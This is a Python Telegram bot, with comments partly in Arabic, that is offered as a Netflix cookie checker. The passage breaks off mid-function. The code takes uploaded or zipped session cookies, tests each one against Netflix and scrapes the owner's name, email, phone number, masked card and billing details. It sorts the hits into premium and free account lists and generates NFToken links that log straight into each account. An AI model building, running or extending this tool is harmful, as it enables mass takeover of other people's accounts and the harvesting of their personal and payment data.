import copy
import html
import json
import os
import re
import sys
import time
import zipfile
from datetime import datetime, timedelta
from io import BytesIO

import requests
from urllib3.exceptions import InsecureRequestWarning

# Telegram imports
try:
    from telegram import Update, BotCommand
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None

# ==================== READ BOT TOKEN ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    sys.exit(1)

# ==================== CONFIGURATION ====================
DEFAULT_CONFIG = {
    "txt_fields": {
        "name": True, "email": True, "max_streams": True, "plan_price": True,
        "plan": True, "country": True, "member_since": True, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": True, "phone": True,
        "quality": True, "hold_status": True, "email_verified": True,
        "membership_status": True, "profiles": True, "user_guid": False,
    },
    "nftoken": "both",
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

DEFAULT_YAML_CONFIG = """# Netflix Checker Configuration
txt_fields:
  name: true
  email: true
  plan: true
  country: true
  member_since: true
  quality: true
  max_streams: true
  plan_price: true
  next_billing: true
  payment_method: true
  card: true
  phone: true
  hold_status: true
  extra_members: true
  email_verified: true
  membership_status: true
  profiles: true
  user_guid: false

nftoken: "both"
add_emojis: "webhook"

notifications:
  webhook:
    enabled: false
    url: ""
    mode: "full"
    plans: "all"
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
    mode: "full"
    plans: "all"

display:
  mode: "simple"

retries:
  error_proxy_attempts: 3
  nftoken_attempts: 1

performance:
  request_timeout_seconds: 15
  fallback_account_page: false
  retry_incomplete_info: false
  nftoken_for_free: false
"""

# Folders
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"

# Bot stats
stats = {"total": 0, "valid": 0, "free": 0, "failed": 0, "processing": 0}
user_tasks = {}

# NFToken API settings
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== HELPER FUNCTIONS ====================

def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here\n")

def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG), "default"
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config), config_yaml_path
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG), config_yaml_path

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def clean_text(text):
    if not text:
        return None
    text = html.unescape(text)
    text = text.replace('\\x20', ' ')
    text = text.replace('\\x40', '@')
    text = text.replace('\\u00A0', ' ')
    text = text.replace('&nbsp;', ' ')
    text = re.sub(r'\s+', ' ', text).strip()
    return text

def decode_netflix_value(value):
    if value is None:
        return None
    return clean_text(str(value))

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    return cleaned.lower() in {"true", "yes", "1", "on"}

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

def normalize_phone_number(phone, country_code=None):
    if not phone:
        return None
    cleaned = re.sub(r'\D', '', str(phone))
    if not cleaned:
        return phone
    if len(cleaned) >= 10:
        return f"+{cleaned}"
    return cleaned

def get_full_country_name(country_code):
    countries = {
        "ZA": "South Africa", "EG": "Egypt", "SA": "Saudi Arabia",
        "AE": "United Arab Emirates", "US": "United States", "GB": "United Kingdom",
        "IN": "India", "PK": "Pakistan", "RO": "Romania", "ID": "Indonesia",
        "MY": "Malaysia", "SG": "Singapore", "PH": "Philippines", "TH": "Thailand",
        "VN": "Vietnam", "BR": "Brazil", "MX": "Mexico", "CA": "Canada",
        "AU": "Australia", "DE": "Germany", "FR": "France", "ES": "Spain",
        "IT": "Italy", "TR": "Turkey", "NL": "Netherlands", "SE": "Sweden",
        "NO": "Norway", "DK": "Denmark", "FI": "Finland", "PL": "Poland",
        "GR": "Greece", "PT": "Portugal", "IE": "Ireland", "BE": "Belgium",
        "CH": "Switzerland", "AT": "Austria", "CZ": "Czech Republic", "HU": "Hungary",
        "IL": "Israel", "JP": "Japan", "KR": "South Korea", "CN": "China",
        "TW": "Taiwan", "HK": "Hong Kong",
    }
    return countries.get(country_code.upper(), country_code)

def country_code_to_flag(country_code):
    raw = decode_netflix_value(country_code) or ""
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw.upper())
    return ""

def format_country_with_flag(country_value):
    country_code = decode_netflix_value(country_value) or "Unknown"
    country_name = get_full_country_name(country_code)
    flag = country_code_to_flag(country_code)
    return f"{country_name} {flag}".strip()

def clean_profile_names(profiles_raw):
    if not profiles_raw:
        return [], 0
    forbidden_names = [
        'android', 'tablet', 'apple', 'windows', 'mac', 'linux',
        'chrome', 'firefox', 'safari', 'edge', 'opera', 'brave',
        'ios', 'ipad', 'iphone', 'smart tv', 'tv', 'netflix',
        'profile', 'user', 'default', 'unknown', 'device',
        'mobile', 'phone', 'computer', 'pc', 'laptop', 'desktop'
    ]
    if isinstance(profiles_raw, list):
        names_list = [p if isinstance(p, str) else p.get('name', '') for p in profiles_raw]
    else:
        names_list = [p.strip() for p in str(profiles_raw).split(",") if p.strip()]
    clean_names = []
    for name in names_list:
        if not name:
            continue
        name_lower = name.lower()
        if name_lower in forbidden_names:
            continue
        if len(name) < 2:
            continue
        skip = False
        for forbidden in forbidden_names:
            if forbidden in name_lower:
                skip = True
                break
        if skip:
            continue
        if re.match(r'^\d+$', name):
            continue
        clean_names.append(name)
    return clean_names, len(clean_names)

def get_membership_status_display(status):
    status_map = {
        "current_member": "Active", "former_member": "Cancelled",
        "active": "Active", "current": "Active", "past_due": "Past Due",
        "CURRENT_MEMBER": "Active"
    }
    return status_map.get(str(status).lower(), status or "Unknown")

def get_nftoken_mode(config):
    val = config.get("nftoken", "both")
    if isinstance(val, bool):
        return "both" if val else "false"
    return str(val).lower()

def has_usable_nftoken(data):
    return data and data.get("token")

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        if token:
            expiry = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
            return {"token": token, "expires_at_utc": expiry}, None
    except:
        pass
    return None, "Failed"

def build_nftoken_links(token, mode):
    if not token or mode == "false":
        return []
    if mode == "pc":
        return [("PC Login", f"https://netflix.com/?nftoken={token}")]
    if mode == "mobile":
        return [("Phone Login", f"https://netflix.com/unsupported?nftoken={token}")]
    return [
        ("PC Login", f"https://netflix.com/?nftoken={token}"),
        ("Phone Login", f"https://netflix.com/unsupported?nftoken={token}"),
    ]


# ==================== NEW: EXTRACT FROM GRAPHQL JSON ====================

def extract_from_graphql_json(html_content):
    """استخراج البيانات من GraphQL JSON داخل الـ HTML"""
    info = {}
    
    # البحث عن الـ GraphQL data في الـ script
    graphql_pattern = r'"graphql":\s*\{\s*"data":\s*({[^}]+(?:{[^}]*}[^}]*)*})'
    match = re.search(graphql_pattern, html_content, re.DOTALL)
    
    if not match:
        # محاولة pattern آخر
        graphql_pattern = r'"data":\s*({[^}]+"growthAccount"[^}]+(?:{[^}]*}[^}]*)*})'
        match = re.search(graphql_pattern, html_content, re.DOTALL)
    
    if match:
        try:
            data = json.loads(match.group(1))
            ga = data.get('growthAccount', {})
            
            # استخراج البيانات من growthAccount
            info['email'] = ga.get('growthLocalizablePhoneNumber', {}).get('rawPhoneNumber', {}).get('phoneNumberDigits', {}).get('value')
            if not info['email']:
                # البحث في مكان آخر للإيميل
                email_match = re.search(r'"emailAddress":"([^"]+)"', html_content)
                if email_match:
                    info['email'] = email_match.group(1)
            
            # الاسم من currentProfile
            name_match = re.search(r'"name":"([^"]+)"[^}]*"isKids":false', html_content)
            if name_match:
                info['accountOwnerName'] = name_match.group(1)
            
            # البلد
            info['countryOfSignup'] = ga.get('countryOfSignUp', {}).get('code', 'AU')
            
            # تاريخ الاشتراك
            member_since = ga.get('memberSince', '')
            if member_since:
                try:
                    d = datetime.fromisoformat(member_since.replace('Z', ''))
                    info['memberSince'] = d.strftime("%B %Y")
                except:
                    info['memberSince'] = member_since
            
            # الباقة
            current_plan = ga.get('currentPlan', {}).get('plan', {})
            info['localizedPlanName'] = current_plan.get('name', 'Premium')
            info['maxStreams'] = 4  # Premium default
            info['videoQuality'] = 'UHD'
            
            # معلومات الدفع
            payment_methods = ga.get('growthPaymentMethods', [])
            if payment_methods:
                info['maskedCard'] = payment_methods[0].get('displayText', '')
                info['paymentMethodType'] = 'Credit Card'
            
            # رقم الهاتف
            phone_info = ga.get('growthLocalizablePhoneNumber', {})
            raw_phone = phone_info.get('rawPhoneNumber', {})
            if raw_phone.get('phoneNumberDigits', {}).get('value'):
                info['phoneNumber'] = raw_phone['phoneNumberDigits']['value']
                info['phoneVerified'] = raw_phone.get('isVerified', False)
            
            # حالة العضوية
            info['membershipStatus'] = ga.get('membershipStatus', 'CURRENT_MEMBER')
            
            # تاريخ الفاتورة القادمة
            next_billing = ga.get('nextBillingDate', {})
            if next_billing.get('localDate'):
                info['nextBillingDate'] = next_billing['localDate']
            
            # السعر
            if current_plan.get('planPrice'):
                info['planPrice'] = current_plan.get('planPrice')
            
        except Exception as e:
            print(f"GraphQL parse error: {e}")
    
    # استخراج أسماء البروفايلات من الـ GraphQL
    profiles = []
    profile_pattern = r'"name":"([^"]+)"[^}]*"isKids":false'
    for match in re.finditer(profile_pattern, html_content):
        name = match.group(1)
        if name and name not in profiles and len(name) > 1:
            profiles.append(name)
    
    if profiles:
        info['profiles'] = ", ".join(profiles)
        info['profileCount'] = len(profiles)
    
    # إذا لم نجد الاسم من قبل، نأخذ أول بروفايل
    if not info.get('accountOwnerName') and profiles:
        info['accountOwnerName'] = profiles[0]
    
    return {k: v for k, v in info.items() if v}


def get_account_page(session, proxy=None, timeout=15):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Accept-Language": "en-US,en;q=0.5",
    }
    # الروابط الصحيحة المحدثة
    urls = [
        "https://www.netflix.com/account/",
        "https://www.netflix.com/account/membership",
    ]
    for url in urls:
        try:
            resp = session.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 200:
                # استخراج من GraphQL JSON أولاً
                info = extract_from_graphql_json(resp.text)
                if info and has_any_account_info(info):
                    return resp.text, resp.status_code, info
        except:
            continue
    return "", 0, {}

def has_any_account_info(info):
    if not info:
        return False
    important_fields = ["countryOfSignup", "membershipStatus", "localizedPlanName", "accountOwnerName", "email"]
    return any(info.get(f) for f in important_fields)


# ==================== COOKIE EXTRACTION FUNCTIONS ====================

def is_netflix_domain(domain):
    domain = str(domain or "").replace("#HttpOnly_", "").lower()
    return "netflix." in domain

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    return bool(cookie_dict.get("NetflixId"))

def split_netscape_cookie_columns(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return []
    if line.startswith("#HttpOnly_"):
        line = line[10:]
    parts = line.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", line, 6)
    return parts if len(parts) >= 7 else []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    return True

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for idx, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain, tail, path, secure, expires, name, value = parts
        if name in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain):
            entries.append({
                "domain": domain, "tail_match": tail, "path": path,
                "secure": secure, "expires": expires, "name": name,
                "value": value, "position": idx
            })
    return entries

def extract_json_cookie_entries(content):
    try:
        data = json.loads(content)
    except:
        return []
    if isinstance(data, dict):
        if "cookies" in data:
            data = data["cookies"]
        elif "items" in data:
            data = data["items"]
        else:
            data = [data]
    if not isinstance(data, list):
        return []
    entries = []
    for idx, cookie in enumerate(data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = cookie.get("name", "")
        if name not in ALL_NETFLIX_COOKIE_NAMES and not is_netflix_domain(domain):
            continue
        tail = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        entries.append({
            "domain": domain, "tail_match": tail, "path": path,
            "secure": secure, "expires": expires, "name": name,
            "value": value, "position": idx
        })
    return entries

def extract_raw_cookie_entries(raw_text):
    entries = []
    for idx, match in enumerate(re.finditer(r"(NetflixId|SecureNetflixId|nfvdid)\s*[:=]\s*([^\s;,\"]+)", raw_text, re.I)):
        name = match.group(1)
        value = match.group(2).strip("\"'")
        entries.append({
            "domain": ".netflix.com", "tail_match": "TRUE", "path": "/",
            "secure": "TRUE", "expires": "0", "name": name,
            "value": value, "position": idx
        })
    return entries

def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    by_name = {}
    for e in entries:
        by_name.setdefault(e["name"], []).append(e)
    bundle_count = max(len(v) for v in by_name.values())
    bundles = []
    for i in range(bundle_count):
        selected = []
        for name, lst in by_name.items():
            if i < len(lst):
                selected.append(lst[i])
            elif len(lst) == 1:
                selected.append(lst[0])
        selected.sort(key=lambda x: x.get("position", 0))
        netscape = "\n".join(
            f"{e['domain']}\t{e['tail_match']}\t{e['path']}\t{e['secure']}\t{e['expires']}\t{e['name']}\t{e['value']}"
            for e in selected
        )
        cookies = {e["name"]: e["value"] for e in selected}
        bundles.append({"netscape_text": netscape, "cookies": cookies})
    return bundles

def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []


# ==================== ACCOUNT INFO FUNCTIONS ====================

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    return re.sub(r"[^\w]+", "_", str(plan_name).lower()).strip("_")

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    norm = normalize_plan_key(raw_plan) if raw_plan else ""
    if norm in ("premium", "premium_plan", "premium_extra_member"):
        return "premium", "Premium"
    if norm in ("standard", "estandar", "standard_with_ads"):
        return "standard", "Standard"
    if norm in ("basic", "basico", "essential"):
        return "basic", "Basic"
    if norm in ("mobile", "ponsel", "seluler"):
        return "mobile", "Mobile"
    streams = info.get("maxStreams")
    if streams:
        try:
            streams = int(str(streams))
            if streams >= 4:
                return "premium", "Premium"
            if streams >= 2:
                return "standard", "Standard"
            if streams == 1:
                return "basic", "Basic"
        except:
            pass
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = str(info.get("membershipStatus", "")).upper()
    return status in ["CURRENT_MEMBER", "ACTIVE", "CURRENT"]

def is_extra_member_account(info):
    plan = str(info.get("localizedPlanName", "")).lower()
    return "extra" in plan

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %d, %Y")
    except:
        pass
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    return cleaned

def get_name_from_profiles(info):
    profiles_raw = info.get("profiles") or ""
    if profiles_raw:
        if isinstance(profiles_raw, str):
            clean_names, _ = clean_profile_names(profiles_raw)
        else:
            clean_names, _ = clean_profile_names(profiles_raw)
        if clean_names:
            return clean_names[0]
    return "Unknown"


# ==================== RESULT FORMATTING ====================

def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None):
    if config is None:
        config, _ = load_config()
    
    plan_key, plan_label = derive_plan_info(info, is_subscribed)
    status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
    
    account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
    if account_name == "Unknown":
        account_name = get_name_from_profiles(info)
    
    email = decode_netflix_value(info.get("email")) or "Unknown"
    email = clean_text(email)
    
    country_raw = decode_netflix_value(info.get("countryOfSignup")) or "Unknown"
    country = format_country_with_flag(country_raw)
    
    plan = plan_label
    price = decode_netflix_value(info.get("planPrice")) or "N/A"
    member_since = format_member_since(info.get("memberSince")) or "Unknown"
    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
    
    payment = decode_netflix_value(info.get("paymentMethodType")) or "Credit Card"
    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
    card_display = f"Card: {card}" if card != "N/A" and card else ""
    
    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
    phone_verified = "Verified" if info.get("phoneVerified") else "Not Verified"
    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
    streams = str(info.get("maxStreams") or "Unknown")
    extra_member = "Yes" if is_extra_member_account(info) else "No"
    email_verified = "Yes" if info.get("emailVerified") else "No"
    
    membership_raw = info.get("membershipStatus") or "Unknown"
    membership_status = get_membership_status_display(membership_raw)
    
    profiles_raw = info.get("profiles") or ""
    clean_profiles, clean_profiles_count = clean_profile_names(profiles_raw)
    
    profiles_display = ", ".join(clean_profiles[:15]) if clean_profiles else "None"
    profiles_count = clean_profiles_count
    
    lines = []
    lines.append("=" * 65)
    lines.append(f"STATUS: {status}")
    lines.append("=" * 65)
    lines.append("")
    lines.append("ACCOUNT DETAILS")
    lines.append("-" * 40)
    lines.append(f"Name: {account_name}")
    lines.append(f"Email: {email}")
    lines.append(f"Country: {country}")
    lines.append(f"Plan: {plan}")
    
    if is_subscribed:
        if price != "N/A" and price:
            lines.append(f"Price: {price}")
        if member_since != "Unknown":
            lines.append(f"Member Since: {member_since}")
        if next_billing != "Unknown":
            lines.append(f"Next Billing: {next_billing}")
        if payment and payment != "Unknown":
            lines.append(f"Payment: {payment}")
        if card_display:
            lines.append(card_display)
        if phone != "N/A" and phone:
            lines.append(f"Phone: {phone} ({phone_verified})")
        if quality != "Unknown":
            lines.append(f"Quality: {quality}")
        if streams != "Unknown":
            lines.append(f"Streams: {streams}")
        lines.append(f"Extra Member: {extra_member}")
        lines.append(f"Email Verified: {email_verified}")
        lines.append(f"Membership Status: {membership_status}")
    else:
        lines.append(f"Email Verified: {email_verified}")
    
    lines.append("")
    lines.append("PROFILES")
    lines.append("-" * 40)
    lines.append(f"Connected Profiles: {profiles_count}")
    lines.append(f"Profiles: {profiles_display}")
    
    if is_subscribed and nftoken_data and has_usable_nftoken(nftoken_data):
        lines.append("")
        lines.append("NFTOKEN LOGIN LINKS")
        lines.append("-" * 40)
        mode = get_nftoken_mode(config)
        for label, link in build_nftoken_links(nftoken_data["token"], mode):
            lines.append(f"{label}:")
            lines.append("")
            lines.append(link)
            lines.append("")
        if nftoken_data.get("expires_at_utc"):
            lines.append(f"Valid Until: {nftoken_data['expires_at_utc']}")
    
    lines.append("")
    lines.append("=" * 65)
    
    return lines, plan_key


# ==================== PROGRESS BAR ====================

def format_progress_message(processed, total, valid_count, premium_count, free_count, invalid_count, speed, eta):
    percentage = (processed / total) * 100 if total > 0 else 0
    filled = int(20 * percentage / 100)
    empty = 20 - filled
    bar = "█" * filled + "░" * empty
    
    return f"""📦 Processing Progress

Total Cookies: {total}

📊 Current Status:
{percentage:.1f}% {bar}

📁 Processing: {processed}/{total}
✅ Valid: {valid_count}
💰 Premium: {premium_count}
🆓 Free: {free_count}
❌ Invalid: {invalid_count}

⚡ Speed: {speed:.1f} acc/s
⏱️ ETA: {eta:.1f}s remaining

⚠️ Use /cancel to stop this task"""


# ==================== TELEGRAM BOT HANDLERS ====================

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    first_name = user.first_name if user.first_name else "User"
    
    await update.message.reply_text(f"""
🎬 Netflix Cookie Checker Bot

✨ Welcome {first_name}! ✨

📌 WHAT I DO:
   ✅ Verify Netflix cookies
   ✅ Extract premium account details
   ✅ Generate NFToken login links

⚙️ HOW TO USE:
   1️⃣ Export cookies (.txt or .json)
   2️⃣ Send files directly (single or ZIP)
   3️⃣ Watch progress bar
   4️⃣ Receive results

🕹️ COMMANDS:
   /start  → Show menu
   /help   → Instructions
   /stats  → Statistics
   /tokenonly  → Token-only mode
   /fullinfo   → Full details mode
   /cancel     → Stop current task
""")

async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📖 HELP & INSTRUCTIONS

STEP 1: Export Cookies
   - EditThisCookie (Chrome)
   - Cookie-Editor (Firefox)
   - Export as JSON for best results

STEP 2: Send Files
   - Send single .txt or .json
   - OR send ZIP with multiple files

STEP 3: Get Results
   - PREMIUM_ACCOUNTS.txt
   - STANDARD_ACCOUNTS.txt
   - BASIC_ACCOUNTS.txt
   - FREE_ACCOUNTS.txt

🔽 USE THE MENU BUTTON FOR COMMANDS
""")

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"""
📊 BOT STATISTICS

Total files processed: {stats['total']}
✅ Valid Premium accounts: {stats['valid']}
🆓 Free accounts: {stats['free']}
❌ Failed/Invalid: {stats['failed']}
🔄 Currently processing: {stats['processing']}

🤖 Bot is running normally
""")

async def bot_tokenonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'tokenonly'
    await update.message.reply_text("🔑 Token Only Mode - ACTIVATED")

async def bot_fullinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'fullinfo'
    await update.message.reply_text("📋 Full Info Mode - ACTIVATED")

async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_tasks and user_tasks[uid].get('active'):
        user_tasks[uid]['cancel'] = True
        await update.message.reply_text("⏹️ Cancellation requested")
    else:
        await update.message.reply_text("ℹ️ No active task to cancel")


# ==================== PROCESS SINGLE BUNDLE ====================

async def process_single_bundle(update, context, bundle, cookie_filename, status_msg, index, total):
    cookies = bundle.get("cookies", {})
    
    if not has_required_netflix_cookies(cookies):
        return None, None, "Missing NetflixId cookie"
    
    await status_msg.edit_text(f"🔄 [{index}/{total}] Checking account...")
    
    config, _ = load_config()
    mode = context.user_data.get('mode', 'fullinfo')
    
    # إنشاء NFToken
    nftoken_data, nftoken_err = create_nftoken(cookies, 1)
    
    if mode == 'fullinfo':
        # محاولة جلب البيانات
        session = requests.Session()
        session.cookies.update(cookies)
        html, status_code, account_info = get_account_page(session, None, 15)
        
        if account_info and has_any_account_info(account_info):
            is_sub = is_subscribed_account(account_info)
            result_lines, plan_key = format_result_beautiful(account_info, is_sub, bundle.get("netscape_text", ""), cookie_filename, nftoken_data, config)
            result = "\n".join(result_lines)
            return result, plan_key, "success" if is_sub else "free"
        else:
            # فشل، نستخدم الـ NFToken فقط
            email = account_info.get('email', 'Unknown') if account_info else 'Unknown'
            result = f"⚠️ Could not fetch full data - {cookie_filename}\n\n"
            result += f"Email: {email}\n\n"
            result += "NFToken Login Links:\n---\n"
            if nftoken_data and has_usable_nftoken(nftoken_data):
                mode_set = get_nftoken_mode(config)
                for label, link in build_nftoken_links(nftoken_data["token"], mode_set):
                    result += f"\n{label}:\n\n{link}\n"
            return result, None, "partial"
    
    else:  # tokenonly mode
        email = "Unknown"
        result = f"Account: {email}\n\n"
        result += "NFToken Login Links:\n---\n"
        if nftoken_data and has_usable_nftoken(nftoken_data):
            mode_set = get_nftoken_mode(config)
            for label, link in build_nftoken_links(nftoken_data["token"], mode_set):
                result += f"\n{label}:\n\n{link}\n"
        return result, None, "success"


# ==================== SINGLE FILE HANDLER ====================

async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
